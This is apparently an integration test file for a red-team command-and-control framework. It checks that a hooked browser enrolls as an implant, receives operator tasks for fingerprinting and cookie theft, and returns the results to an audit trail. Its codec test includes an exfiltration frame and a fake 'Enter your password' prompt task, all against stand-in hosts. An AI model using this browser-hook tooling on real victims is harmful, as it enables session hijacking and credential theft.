using System.Buffers.Binary;
using System.Diagnostics;
using System.Net;
using System.Net.Http.Json;
using System.Text;
using System.Text.Json;
using System.Text.RegularExpressions;
using Google.Protobuf;
using Microsoft.AspNetCore.Hosting;
using Microsoft.Extensions.DependencyInjection;
using Microsoft.Extensions.Hosting;
using Rod.Audit;
using Rod.Transport;
using Rod.Transport.Endpoints;
using Rod.Transport.Hooks;
using Rod.Transport.Listeners;
using Rod.Transport.Payloads;
using Rod.V1;
using static Rod.Integration.Tests.EngagementSetup;

namespace Rod.Integration.Tests;

/// <summary>
/// A fact that runs only when a Node runtime is on PATH: the golden-vector
/// smoke that pins the served hook's hand-rolled JavaScript codec against
/// the same wire bytes the .NET side produces.
/// </summary>
public sealed class NodeFactAttribute : FactAttribute
{
    public NodeFactAttribute()
    {
        try
        {
            var probe = Process.Start(new ProcessStartInfo
            {
                FileName = "node",
                ArgumentList = { "--version" },
                UseShellExecute = false,
                RedirectStandardOutput = true,
                RedirectStandardError = true,
            });
            probe?.WaitForExit(5000);
            if (probe is null || probe.ExitCode != 0)
                Skip = "node is not usable on PATH";
        }
        catch
        {
            Skip = "node is not on PATH";
        }
    }
}

/// <summary>
/// The browser-hook acceptance criterion, pinned: "a hooked browser on a
/// test page enrolls as a Browser-class implant over the envelope carrier,
/// and an operator tasks a fingerprint and a cookie read against it, with
/// both results in the audit trail" (docs/todo.md, the item's own AC).
///
/// The fake hook here is a from-scratch C# client that bootstraps exactly
/// the way the served script does -- it parses the bake out of the fetched
/// artifact -- and then speaks the hook's wire obligations verbatim: the
/// sealed JSON enroll with class "browser" under the baked key, and sealed
/// envelope contacts (counter || framed rod.v1 protobuf) over
/// <c>POST /implants/beacon</c>. The real browser leg of the same criterion
/// runs in the rehearsal walk (docs/operations/rehearsal.md); this is its
/// CI pin.
/// </summary>
public class BrowserHookEndToEndTests
{
    [Fact]
    public async Task HookedBrowser_EnrollsAsBrowserClass_AndAnswersFingerprintAndCookieReads()
    {
        await using var env = await HookE2EEnv.StartAsync();
        var engagementId = await CreateEngagementAsync(env.Http);
        var listenerId = await env.CreateEngagementListenerAsync(engagementId, "http://c2.example.test");

        // The mint, through the operator surface the Launchers tab drives.
        var minted = await env.Http.PostAsJsonAsync(
            $"/engagements/{engagementId}/hooks",
            new MintHookRequest(ListenerId: listenerId, SleepSeconds: 5, JitterSeconds: 0));
        minted.EnsureSuccessStatusCode();
        var hook = await minted.Content.ReadFromJsonAsync<MintHookResponse>();
        Assert.NotNull(hook);

        // The victim's half: fetch the script off the engagement listener and
        // bootstrap from its bake -- everything the fake hook "knows" comes
        // from the served artifact, nothing from the operator side.
        var script = await env.Implant.GetStringAsync($"/implants/hooks/{hook!.HookId}");
        var bake = HookBake.Parse(script);
        Assert.Equal("browser.fingerprint", bake.Verbs[0]);
        Assert.EndsWith("/implants/enroll", bake.EnrollUrl);
        Assert.EndsWith("/implants/beacon", bake.BeaconUrl);
        Assert.False(string.IsNullOrEmpty(bake.BakedKey));

        // The sealed enroll the hook's posture produces: the enroll JSON as
        // R1 ciphertext under the baked key and the enroll purpose tag, then
        // that base64 wrapped in a JSON string literal -- the shape the
        // route's leading-quote branch unwraps.
        Assert.True(AesGcmEnvelope.TryUnbake(bake.BakedKey, out var keyId, out var key));
        var enrollJson = JsonSerializer.Serialize(new Dictionary<string, object?>
        {
            ["deployTokenSecret"] = bake.Token,
            ["class"] = "browser",
            ["hostname"] = "victim.example",
            ["os"] = "TestOS",
            ["arch"] = "browser",
            ["sleepSeconds"] = 5,
            ["jitterSeconds"] = 0,
        });
        var sealedEnroll = JsonSerializer.Serialize(AesGcmEnvelope.Wrap(
            Encoding.UTF8.GetBytes(enrollJson), keyId, key, AesGcmEnvelope.Aad));
        var enrolled = await env.Implant.PostAsync(
            "/implants/enroll", new StringContent(sealedEnroll, Encoding.UTF8, "application/json"));
        Assert.Equal(HttpStatusCode.OK, enrolled.StatusCode);
        var enrollBody = await enrolled.Content.ReadFromJsonAsync<JsonElement>();
        Assert.Equal(1, enrollBody.GetProperty("status").GetInt32());
        var implantId = enrollBody.GetProperty("implantId").GetString();
        Assert.False(string.IsNullOrEmpty(implantId));

        // Contact one: the handshake opens the session and the implant comes
        // online in the fleet as a Browser-class row.
        var client = new FakeHookClient(env.Implant, bake);
        client.Bind(implantId!);
        var first = await client.ContactAsync();
        Assert.Equal((int)HandshakeStatus.Ok, first.Status);

        var roster = await env.Http.GetFromJsonAsync<ImplantEndpoints.ImplantResponse[]>(
            $"/engagements/{engagementId}/implants");
        var row = Assert.Single(roster!, r => r.ImplantId == implantId);
        Assert.Equal("Browser", row.Class);
        Assert.True(row.IsOnline);

        // The operator tasks a fingerprint and a cookie read -- the AC's pair.
        var fingerprintTask = await IssueTaskAsync(env.Http, engagementId, implantId!, "browser.fingerprint");
        var cookiesTask = await IssueTaskAsync(env.Http, engagementId, implantId!, "browser.cookies");

        // Contact two: the poll cycle's dispatch hands both tasks over.
        var second = await client.ContactAsync();
        Assert.Equal((int)HandshakeStatus.Ok, second.Status);
        Assert.Equal(2, second.Tasks.Count);
        Assert.Contains(second.Tasks, t => t.Verb == "browser.fingerprint");
        Assert.Contains(second.Tasks, t => t.Verb == "browser.cookies");

        // Contact three: the results ride back exactly the way the script's
        // handlers would queue them -- a fingerprint JSON blob and the
        // cookie string of the hooked origin.
        var third = await client.ContactAsync(results: second.Tasks.Select(t => new FakeHookClient.Result(
            t.TaskId,
            Succeeded: true,
            Output: t.Verb == "browser.fingerprint"
                ? "{\"userAgent\":\"rod-test\",\"pageUrl\":\"https://victim.example/page\"}"
                : "session=abc123")).ToArray());
        Assert.Equal((int)HandshakeStatus.Ok, third.Status);

        foreach (var (taskId, verb, marker) in new[]
                 {
                     (fingerprintTask, "browser.fingerprint", "rod-test"),
                     (cookiesTask, "browser.cookies", "session=abc123"),
                 })
        {
            var task = await WaitForTaskAsync(env.Http, engagementId, taskId);
            Assert.NotNull(task);
            Assert.Equal("Completed", task!.Status);
            Assert.Equal("Succeeded", task.Outcome);
            Assert.Contains(marker, task.Output);
        }

        // The audit trail: both tasks' full attributed arcs beside the
        // enrollment fact that carries the class (architecture.md Sec 11).
        var audit = env.Host.Services.GetRequiredService<IAuditStore>();
        var engagement = Guid.Parse(engagementId);
        foreach (var taskId in new[] { fingerprintTask, cookiesTask })
        {
            var arc = await audit.ForTaskAsync(Guid.Parse(taskId));
            Assert.Contains(arc, e => e.Kind == AuditEventKind.TaskIssued);
            Assert.Contains(arc, e => e.Kind == AuditEventKind.TaskDispatched);
            Assert.Contains(arc, e => e.Kind == AuditEventKind.TaskCompleted);
        }
        var enrolledFact = (await audit.ListAsync(engagement))
            .Single(e => e.Kind == AuditEventKind.ImplantEnrolled);
        Assert.Contains("Browser", enrolledFact.Payload);
        Assert.Equal(implantId, enrolledFact.Outcome);
    }

    [NodeFact]
    public async Task HookCodec_RoundTripsTheWireBytesTheDotNetSideProduces()
    {
        // Golden vectors from the .NET encoder: a contact body's frames
        // (handshake, result, exfil chunk) and a dispatched task. The served
        // script's own codec -- extracted verbatim from the rendered
        // template -- must parse and re-encode them byte-for-byte, the
        // cross-language conformance the wire contract promises.
        var frames = new[]
        {
            new Frame
            {
                Payload = ByteString.CopyFrom(new HandshakeRequest
                {
                    Version = new ProtocolVersion { Major = 1, Minor = 0 },
                    ImplantId = "01234567-89ab-cdef-0123-456789abcdef",
                    Capabilities = { "browser.fingerprint", "browser.cookies", "browser.dom" },
                    SleepSeconds = 12.5,
                    JitterSeconds = 1.5,
                }.ToByteArray()),
            },
            new Frame
            {
                Payload = ByteString.CopyFrom(new TaskResult
                {
                    TaskId = "11111111-1111-1111-1111-111111111111",
                    Outcome = TaskOutcome.Succeeded,
                    Output = "{\"userAgent\":\"rod-test\"}",
                }.ToByteArray()),
            },
            new Frame
            {
                Kind = FrameKind.ExfilChunk,
                Payload = ByteString.CopyFrom(new ExfilChunk
                {
                    TaskId = "11111111-1111-1111-1111-111111111111",
                    Name = "screenshot.png",
                    ContentType = "image/png",
                    Sequence = 0,
                    Terminal = true,
                    Data = ByteString.CopyFrom(new byte[] { 1, 2, 3, 4 }),
                }.ToByteArray()),
            },
        };
        var contactBody = Convert.ToBase64String(EnvelopeFraming.Encode(frames));
        var taskFrame = Convert.ToBase64String(EnvelopeFraming.Encode(new[]
        {
            new Frame
            {
                Payload = ByteString.CopyFrom(new TaskRequest
                {
                    TaskId = "22222222-2222-2222-2222-222222222222",
                    Verb = "browser.prompt",
                    Arguments = "Enter your password",
                }.ToByteArray()),
            },
        }));

        // The codec section of the real rendered artifact, sliced between its
        // marker comments: byte helpers, protobuf micro-codec, frames, and
        // messages -- the whole dependency-free region.
        var rendered = Encoding.UTF8.GetString(BrowserHookScript.Render(new BrowserHookBake(
            "http://front/implants/enroll", "http://front/implants/beacon", "s", null,
            new[] { "browser.fingerprint" }, 5, 0, null)));
        var start = rendered.IndexOf("// ---- byte helpers", StringComparison.Ordinal);
        var end = rendered.IndexOf("// ---- seal", StringComparison.Ordinal);
        Assert.True(start > 0 && end > start);
        var codec = rendered[start..end];

        var result = await NodeRunner.RunAsync($$"""
            const section = {{JsonSerializer.Serialize(codec)}};
            const vectors = {
              contactBody: {{JsonSerializer.Serialize(contactBody)}},
              taskFrame: {{JsonSerializer.Serialize(taskFrame)}},
            };
            eval(section);

            function bytes(b64) {
              return Uint8Array.from(Buffer.from(b64, 'base64'));
            }
            function b64(u8) {
              return Buffer.from(u8).toString('base64');
            }

            const frames = parseFrames(bytes(vectors.contactBody));
            const kinds = frames.map(f => f.kind);
            const reEncoded = b64(encodeFrames(frames));
            const task = parseTaskRequest(parseFrames(bytes(vectors.taskFrame))[0].payload);
            const handshake = parseHandshakeResponse(frames[0].payload);
            const resultBytes = taskResultBytes('33333333-3333-3333-3333-333333333333', true, 'out');
            console.log(JSON.stringify({
              frameCount: frames.length,
              kinds: kinds,
              roundTripExact: reEncoded === vectors.contactBody,
              taskVerb: task.verb,
              taskArguments: task.arguments,
              taskId: task.taskId,
              handshakeStatus: handshake.status,
              resultLen: resultBytes.length > 0,
            }));
            """);

        using var document = JsonDocument.Parse(result);
        var verdict = document.RootElement;
        Assert.Equal(3, verdict.GetProperty("frameCount").GetInt32());
        Assert.Equal(new[] { 0, 0, 2 }, verdict.GetProperty("kinds").EnumerateArray().Select(k => k.GetInt32()));
        Assert.True(verdict.GetProperty("roundTripExact").GetBoolean());
        Assert.Equal("browser.prompt", verdict.GetProperty("taskVerb").GetString());
        Assert.Equal("Enter your password", verdict.GetProperty("taskArguments").GetString());
        Assert.Equal("22222222-2222-2222-2222-222222222222", verdict.GetProperty("taskId").GetString());
        Assert.Equal(0, verdict.GetProperty("handshakeStatus").GetInt32());
        Assert.True(verdict.GetProperty("resultLen").GetBoolean());
    }

    private static async Task<string> IssueTaskAsync(
        HttpClient http, string engagementId, string implantId, string verb)
    {
        var issued = await http.PostAsJsonAsync(
            $"/engagements/{engagementId}/tasks",
            new { ImplantId = implantId, Verb = verb, Arguments = "" });
        issued.EnsureSuccessStatusCode();
        var body = await issued.Content.ReadFromJsonAsync<JsonElement>();
        return body.GetProperty("taskId").GetString()!;
    }

    private static async Task<TaskBody?> WaitForTaskAsync(
        HttpClient http, string engagementId, string taskId)
    {
        for (var attempt = 0; attempt < 50; attempt++)
        {
            var task = await http.GetFromJsonAsync<TaskBody>(
                $"/engagements/{engagementId}/tasks/{taskId}");
            if (task is { Status: "Completed" })
                return task;
            await Task.Delay(100);
        }
        return await http.GetFromJsonAsync<TaskBody>($"/engagements/{engagementId}/tasks/{taskId}");
    }

    private sealed record TaskBody(string TaskId, string Status, string? Outcome, string? Output);

    /// <summary>The bake as the served artifact carries it, parsed the way a
    /// bootstrapping client (the browser, or this test) reads it.</summary>
    private sealed record HookBake(string EnrollUrl, string BeaconUrl, string Token, string BakedKey, string[] Verbs)
    {
        public static HookBake Parse(string script)
        {
            // The bake is one compact JSON line the renderer substitutes;
            // keep the match on that line so nothing below it bleeds in.
            var match = Regex.Match(script, @"var ROD_HOOK_BAKE = (\{.*\});");
            Assert.True(match.Success, "the served script carries its bake");
            using var bake = JsonDocument.Parse(match.Groups[1].Value);
            var root = bake.RootElement;
            return new HookBake(
                root.GetProperty("enrollUrl").GetString()!,
                root.GetProperty("beaconUrl").GetString()!,
                root.GetProperty("token").GetString()!,
                root.GetProperty("bakedKey").GetString() ?? "",
                root.GetProperty("verbs").EnumerateArray().Select(v => v.GetString()!).ToArray());
        }
    }

    /// <summary>
    /// A from-scratch hook client: the sealed JSON enroll shape and the
    /// sealed envelope contacts the served script produces, built on the
    /// same protobuf and R1 pieces the .NET tests use.
    /// </summary>
    private sealed class FakeHookClient
    {
        private readonly HttpClient _http;
        private readonly HookBake _bake;
        private readonly Guid _keyId;
        private readonly byte[] _key;
        private long _counter;

        public sealed record Result(string TaskId, bool Succeeded, string Output);
        public sealed record Contact(int Status, IReadOnlyList<TaskRequest> Tasks);

        public FakeHookClient(HttpClient http, HookBake bake)
        {
            _http = http;
            _bake = bake;
            Assert.True(AesGcmEnvelope.TryUnbake(bake.BakedKey, out _keyId, out _key));
        }

        public async Task<Contact> ContactAsync(IReadOnlyList<Result>? results = null)
        {
            var outbound = new List<Frame>
            {
                new()
                {
                    Payload = ByteString.CopyFrom(new HandshakeRequest
                    {
                        Version = new ProtocolVersion { Major = 1, Minor = 0 },
                        ImplantId = _implantId!,
                        Capabilities = { _bake.Verbs },
                        SleepSeconds = 5,
                        JitterSeconds = 0,
                    }.ToByteArray()),
                },
            };
            foreach (var result in results ?? Array.Empty<Result>())
            {
                outbound.Add(new Frame
                {
                    Payload = ByteString.CopyFrom(new TaskResult
                    {
                        TaskId = result.TaskId,
                        Outcome = result.Succeeded ? TaskOutcome.Succeeded : TaskOutcome.Failed,
                        Output = result.Output,
                    }.ToByteArray()),
                });
            }

            var framed = EnvelopeFraming.Encode(outbound);
            var plaintext = new byte[8 + framed.Length];
            BinaryPrimitives.WriteInt64BigEndian(plaintext, ++_counter);
            framed.CopyTo(plaintext, 8);

            var sealedBody = AesGcmEnvelope.Wrap(plaintext, _keyId, _key, AesGcmEnvelope.ContactRequestAad);
            using var response = await _http.PostAsync(
                "/implants/beacon", new StringContent(sealedBody, Encoding.UTF8, "text/plain"));
            Assert.Equal(HttpStatusCode.OK, response.StatusCode);
            var sealedAnswer = await response.Content.ReadAsStringAsync();
            var opened = AesGcmEnvelope.TryUnwrap(
                sealedAnswer.Trim(), _keyId, _key, AesGcmEnvelope.ContactResponseAad);
            Assert.NotNull(opened);

            var inbound = EnvelopeFraming.Parse(opened!);
            var handshake = HandshakeResponse.Parser.ParseFrom(inbound[0].Payload);
            var tasks = inbound.Skip(1)
                .Select(f => TaskRequest.Parser.ParseFrom(f.Payload))
                .Where(t => !string.IsNullOrEmpty(t.TaskId))
                .ToList();
            return new Contact((int)handshake.Status, tasks);
        }

        private string? _implantId;
        public void Bind(string implantId) => _implantId = implantId;
    }

    private sealed class HookE2EEnv : IAsyncDisposable
    {
        public IHost Host { get; private set; } = null!;
        public HttpClient Http { get; private set; } = null!;
        public HttpClient Implant { get; private set; } = null!;

        public static async Task<HookE2EEnv> StartAsync()
        {
            var env = new HookE2EEnv();
            var operatorBind = $"127.0.0.1:{TestSupport.GetFreeTcpPort()}";
            var config = AuthenticatedHost.BuildConfig();
            env.Host = TransportHost.CreateHostBuilder(
                    configureServices: services => AuthenticatedHost.ComposeServices(services, config),
                    mapEndpoints: endpoints => AuthenticatedHost.ComposeEndpoints(endpoints),
                    configuration: config)
                .ConfigureWebHost(webBuilder => webBuilder.UseRodListeners(new List<ListenerConfig>
                {
                    new(
                        Name: "operator-http",
                        Transport: "http",
                        BindAddress: operatorBind,
                        PublicEndpoint: "http://localhost:5080"),
                }))
                .Build();
            await env.Host.StartAsync();

            env.Http = new HttpClient(new CookieHandler(new HttpClientHandler()))
            {
                BaseAddress = new Uri($"http://{operatorBind}"),
            };
            await AuthenticatedHost.LoginAsync(env.Http);
            return env;
        }

        public async Task<string> CreateEngagementListenerAsync(string engagementId, string publicEndpoint)
        {
            var created = await Http.PostAsJsonAsync(
                $"/engagements/{engagementId}/listeners",
                new ListenerEndpoints.CreateListenerRequest(
                    Name: "hook-front-" + Guid.NewGuid().ToString("N")[..6],
                    Transport: "http",
                    BindAddress: $"127.0.0.1:{TestSupport.GetFreeTcpPort()}",
                    PublicEndpoint: publicEndpoint));
            created.EnsureSuccessStatusCode();
            var listener = await created.Content.ReadFromJsonAsync<ListenerEndpoints.ListenerResponse>();
            Assert.NotNull(listener);
            Implant?.Dispose();
            Implant = new HttpClient { BaseAddress = new Uri($"http://{listener!.BindAddress}") };
            return listener.Id;
        }

        public async ValueTask DisposeAsync()
        {
            Http?.Dispose();
            Implant?.Dispose();
            if (Host is not null)
                await Host.StopAsync();
            Host?.Dispose();
        }
    }
}

file static class NodeRunner
{
    public static async Task<string> RunAsync(string script)
    {
        var file = Path.Combine(Path.GetTempPath(), $"rod-hook-smoke-{Guid.NewGuid():N}.cjs");
        await File.WriteAllTextAsync(file, script);
        try
        {
            var start = new ProcessStartInfo
            {
                FileName = "node",
                ArgumentList = { file },
                UseShellExecute = false,
                RedirectStandardOutput = true,
                RedirectStandardError = true,
            };
            using var process = Process.Start(start)!;
            var stdout = await process.StandardOutput.ReadToEndAsync();
            await process.WaitForExitAsync();
            Assert.True(process.ExitCode == 0, $"node exited {process.ExitCode}: {await process.StandardError.ReadToEndAsync()}");
            return stdout.Trim();
        }
        finally
        {
            File.Delete(file);
        }
    }
}
